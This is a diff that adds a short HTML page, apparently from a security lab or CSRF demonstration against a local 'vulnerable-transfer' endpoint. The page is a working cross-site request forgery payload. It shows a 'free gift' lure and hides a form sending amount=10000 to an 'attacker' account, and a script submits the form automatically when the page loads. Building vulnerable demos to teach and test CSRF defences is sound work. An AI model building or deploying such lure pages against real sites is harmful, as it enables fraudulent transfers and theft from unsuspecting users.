@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <title>Free Gift</title>
+</head>
+
+<body>
+
+  <h1>Congratulations! 🎁</h1>
+
+  <p>You won a free gift!</p>
+
+  <form
+    action="http://localhost:3000/vulnerable-transfer"
+    method="POST"
+    id="attackForm"
+  >
+
+    <input
+      type="hidden"
+      name="amount"
+      value="10000"
+    >
+
+    <input
+      type="hidden"
+      name="to"
+      value="attacker"
+    >
+
+  </form>
+
+  <script>
+    document.getElementById("attackForm").submit();
+  </script>
+
+</body>
+
+</html>
